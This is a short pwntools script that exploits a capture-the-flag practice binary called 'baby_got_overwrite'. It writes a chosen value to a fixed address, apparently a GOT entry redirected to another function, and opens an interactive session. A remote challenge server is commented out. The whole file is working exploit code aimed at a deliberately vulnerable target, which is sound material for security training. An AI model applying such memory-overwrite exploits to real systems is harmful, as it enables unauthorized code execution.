from pwn import *

# p = remote("war.sschall.xyz", 33032)
p = process("./baby_got_overwrite")

p.recvuntil(b"Addr : ")
p.sendline(str(int(0x404028)).encode())
p.recvuntil(b"Value : ")
p.sendline(str(int(0x4011fd)).encode())
p.interactive()